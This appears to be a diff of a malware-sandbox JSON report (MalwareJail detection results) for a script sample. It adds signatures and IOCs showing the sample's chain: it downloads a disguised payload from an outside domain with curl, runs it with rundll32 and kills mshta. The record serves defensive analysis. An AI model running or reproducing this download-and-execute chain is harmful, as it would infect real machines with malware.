@@ -1,7 +1,7 @@
 {
   "extra": {
     "drop_file": false,
-    "score": 511,
+    "score": 1632,
     "sections": [
       {
         "auto_collapse": false,
@@ -202,7 +202,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript creates an ActiveXObject\n\t\tvar ws = new ActiveXObject('WScript.Shell')",
+        "body": "JavaScript creates an ActiveXObject\n\t\tActiveXObject(WScript.Shell)\n\t\tnew Function(url, function sleep(millis){var date = new Date();var curDate = null;do { curDate = new...\n\t\tActiveXObject(wscript.shell)\n\t\tActiveXObject(shell.application)\n\t\tvar ws = new ActiveXObject('WScript.Shell')",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -222,6 +222,229 @@
         "promote_to": null,
         "tags": {},
         "title_text": "Signature: ActiveXObject",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "JavaScript creates a new Windows Scripting Host Shell Object\n\t\tnew WScript.Shell[16]()\n\t\tnew WScript.Shell[18]()\n\t\tnew WScript.Shell[20]()",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 10,
+          "score_map": {
+            "creates_wsh_object": 10
+          },
+          "signatures": {
+            "creates_wsh_object": 1
+          }
+        },
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Signature: CreatesWshObject",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "JavaScript runs dropped executable\n\t\tnew Function(url, function sleep(millis){var date = new Date();var curDate = null;do { curDate = new...\n\t\tWScript.Shell[18].run(\"curl.exe --output C:\\ProgramData\\1.png --url https://finetuning-digital.com/w...\n\t\tWScript.Shell[20].run(\"taskkill /f /im mshta.exe\", 0)",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 500,
+          "score_map": {
+            "runs_executable": 500
+          },
+          "signatures": {
+            "runs_executable": 1
+          }
+        },
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Signature: RunsExecutable",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "JavaScript runs code via shell\n\t\tnew Function(url, function sleep(millis){var date = new Date();var curDate = null;do { curDate = new...\n\t\tWScript.Shell[18].run(\"curl.exe --output C:\\ProgramData\\1.png --url https://finetuning-digital.com/w...\n\t\tWScript.Shell[20].run(\"taskkill /f /im mshta.exe\", 0)",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 10,
+          "score_map": {
+            "runs_shell": 10
+          },
+          "signatures": {
+            "runs_shell": 1
+          }
+        },
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Signature: RunsShell",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "JavaScript runs code via shell application\n\t\tShell.Application[19].shellexecute(\"rundll32\", \"C:\\ProgramData\\1.png,Wind\", \"\", \"open\", 3)",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 100,
+          "score_map": {
+            "runs_shell_application": 100
+          },
+          "signatures": {
+            "runs_shell_application": 1
+          }
+        },
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Signature: RunsShellApplication",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": [
+          {
+            "ioc": "finetuning-digital.com",
+            "ioc_type": "domain"
+          },
+          {
+            "ioc": "google.com",
+            "ioc_type": "domain"
+          },
+          {
+            "ioc": "https://finetuning-digital.com/wRuLe/01.gif",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "https://google.com",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "/wRuLe/01.gif",
+            "ioc_type": "uri_path"
+          }
+        ],
+        "body_config": {
+          "column_order": [
+            "ioc_type",
+            "ioc"
+          ]
+        },
+        "body_format": "TABLE",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 2,
+          "score": 1,
+          "score_map": {},
+          "signatures": {}
+        },
+        "promote_to": null,
+        "tags": {
+          "network": {
+            "static": {
+              "domain": [
+                "finetuning-digital.com",
+                "google.com"
+              ],
+              "uri": [
+                "https://finetuning-digital.com/wRuLe/01.gif",
+                "https://google.com"
+              ],
+              "uri_path": [
+                "/wRuLe/01.gif"
+              ]
+            }
+          }
+        },
+        "title_text": "MalwareJail extracted the following IOCs",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": [
+          {
+            "ioc": "finetuning-digital.com",
+            "ioc_type": "domain"
+          },
+          {
+            "ioc": "https://finetuning-digital.com/wRuLe/01.gif",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "/wRuLe/01.gif",
+            "ioc_type": "uri_path"
+          }
+        ],
+        "body_config": {
+          "column_order": [
+            "ioc_type",
+            "ioc"
+          ]
+        },
+        "body_format": "TABLE",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 13,
+          "score": 500,
+          "score_map": {
+            "wscript_curl_url": 500
+          },
+          "signatures": {
+            "wscript_curl_url": 1
+          }
+        },
+        "promote_to": null,
+        "tags": {
+          "dynamic": {
+            "process": {
+              "command_line": [
+                "curl.exe --output C:\\ProgramData\\1.png --url https://finetuning-digital.com/wRuLe/01.gif",
+                "rundll32 C:\\ProgramData\\1.png,Wind ",
+                "taskkill /f /im mshta.exe"
+              ]
+            }
+          },
+          "network": {
+            "dynamic": {
+              "domain": [
+                "finetuning-digital.com"
+              ],
+              "uri": [
+                "https://finetuning-digital.com/wRuLe/01.gif"
+              ],
+              "uri_path": [
+                "/wRuLe/01.gif"
+              ]
+            }
+          }
+        },
+        "title_text": "IOCs extracted from WScript",
         "zeroize_on_tag_safe": false
       },
       {
@@ -257,6 +480,10 @@
   "files": {
     "extracted": [
       {
+        "name": "extracted_wscript.bat",
+        "sha256": "4ce990b0c66bc3b228fb17f6f6de47d906d27499f4d612e197943d3358a17741"
+      },
+      {
         "name": "1mOL6GguFNN20vLG6cDkt6.vbs",
         "sha256": "71411585d666edab58a99aeb7bec26106ec0bb47175f11a3e1292843726e9cf0"
       },
@@ -281,9 +508,42 @@
       },
       {
         "attack_ids": [],
+        "heur_id": 2,
+        "signatures": []
+      },
+      {
+        "attack_ids": [],
         "heur_id": 3,
         "signatures": [
           "active_x_object"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "creates_wsh_object"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "runs_executable"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "runs_shell"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "runs_shell_application"
         ]
       },
       {
@@ -292,9 +552,39 @@
         "signatures": [
           "suspicious_url_found"
         ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 13,
+        "signatures": [
+          "wscript_curl_url"
+        ]
       }
     ],
     "tags": {
+      "dynamic.process.command_line": [
+        {
+          "heur_id": 13,
+          "signatures": [
+            "wscript_curl_url"
+          ],
+          "value": "curl.exe --output C:\\ProgramData\\1.png --url https://finetuning-digital.com/wRuLe/01.gif"
+        },
+        {
+          "heur_id": 13,
+          "signatures": [
+            "wscript_curl_url"
+          ],
+          "value": "rundll32 C:\\ProgramData\\1.png,Wind "
+        },
+        {
+          "heur_id": 13,
+          "signatures": [
+            "wscript_curl_url"
+          ],
+          "value": "taskkill /f /im mshta.exe"
+        }
+      ],
       "file.behavior": [
         {
           "heur_id": null,
@@ -309,6 +599,33 @@
           "value": "1343777b8ead1cef5a79b78a1a48d805"
         }
       ],
+      "network.dynamic.domain": [
+        {
+          "heur_id": 13,
+          "signatures": [
+            "wscript_curl_url"
+          ],
+          "value": "finetuning-digital.com"
+        }
+      ],
+      "network.dynamic.uri": [
+        {
+          "heur_id": 13,
+          "signatures": [
+            "wscript_curl_url"
+          ],
+          "value": "https://finetuning-digital.com/wRuLe/01.gif"
+        }
+      ],
+      "network.dynamic.uri_path": [
+        {
+          "heur_id": 13,
+          "signatures": [
+            "wscript_curl_url"
+          ],
+          "value": "/wRuLe/01.gif"
+        }
+      ],
       "network.static.domain": [
         {
           "heur_id": 12,
@@ -316,6 +633,16 @@
             "suspicious_url_found"
           ],
           "value": "finetuning-digital.com"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "finetuning-digital.com"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "google.com"
         }
       ],
       "network.static.uri": [
@@ -325,6 +652,16 @@
             "suspicious_url_found"
           ],
           "value": "https://finetuning-digital.com/wRuLe/01.gif"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "https://finetuning-digital.com/wRuLe/01.gif"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "https://google.com"
         }
       ],
       "network.static.uri_path": [
@@ -333,6 +670,11 @@
           "signatures": [
             "suspicious_url_found"
           ],
+          "value": "/wRuLe/01.gif"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
           "value": "/wRuLe/01.gif"
         }
       ]
